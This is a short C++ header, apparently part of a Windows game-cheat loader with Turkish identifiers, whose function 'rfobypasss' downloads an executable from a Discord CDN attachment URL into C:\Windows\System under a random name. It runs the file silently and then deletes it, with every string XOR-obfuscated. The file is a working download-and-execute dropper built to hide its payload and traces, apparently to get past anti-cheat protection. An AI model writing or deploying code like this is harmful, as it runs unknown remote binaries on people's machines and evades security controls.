#pragma once
#include <Windows.h>
#include <iostream>
#include <urlmon.h>
#include <filesystem>
#include <string>
#include "../þifreleme/xor.h"
#pragma comment (lib, "urlmon.lib")



std::string mapper = (_xor_("https://cdn.discordapp.com/attachments/945364057681166380/945364085762039858/masdjasudas7ud.exe").c_str());
std::string mapperkonum = (_xor_("C:\\Windows\\System\\kx8IX217X.exe").c_str());
std::string baslatma = (_xor_("C:\\Windows\\System\\kx8IX217X.exe >nul 2>&1").c_str());

void rfobypasss() {
	DeleteFileA(mapperkonum.c_str());
	Sleep(900);
	URLDownloadToFileA(NULL, mapper.c_str(), mapperkonum.c_str(), 0, NULL);
	Sleep(900);
	system(baslatma.c_str());
	Sleep(2000);
	DeleteFileA(mapperkonum.c_str());
}
